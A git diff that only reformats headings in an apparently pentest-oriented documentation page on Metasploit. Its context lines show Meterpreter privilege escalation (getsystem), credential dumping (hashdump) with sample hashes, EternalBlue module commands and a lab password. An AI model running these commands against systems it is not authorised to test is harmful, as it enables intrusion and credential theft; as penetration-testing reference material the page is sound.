@@ -13,19 +13,19 @@ weight : 0
 
 The world's most used penetration testing framework.
 
-### Installation
+## Installation
 
 Please use [Kali Linux](https://www.kali.org/)
 
 Download newest release from [Github.com](https://github.com/rapid7/metasploit-framework/releases)
 
-### Usage
+## Usage
 
 ```plain
 msfconsole [options]
 ```
 
-### Flags
+## Flags
 
 ```plain
 Usage: msfconsole [options]
@@ -60,14 +60,14 @@ Console options:
 
 ### Meterpreter examples
 
-#### getsystem
+### getsystem
 
 ```plain
 meterpreter > getsystem
 ...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
 ```
 
-#### hashdump
+### hashdump
 
 ```plain
 meterpreter > hashdump
@@ -80,19 +80,19 @@ janedo:1110:aad3b435b51404eeaad3b435b51404ee:f3fe13546c4c0d2db443a0865626203b:::
 [...]
 ```
 
-### Examples
+## Examples
 
 ### MS17-010 - Eternalblue
 
 {{%attachments title="Related files" fa_icon_class="far fa-file-video" pattern="ms17-010.*(mp4)"/%}}
 
-#### Scanner
+### Scanner
 
 ```plain
 msf5 > use auxiliary/scanner/smb/smb_ms17_010
 ```
 
-#### Exploit
+### Exploit
 
 ```plain
 msf5 > use exploit/windows/smb/ms17_010_eternalblue
@@ -141,7 +141,7 @@ Administrator  OFFSEC   Welkom1234
 [...]
 ```
 
-### URL list
+## URL List
 
 * [Metasploit.com](https://www.metasploit.com/)
 * [Offensive-security.com Meterpreter](https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/)
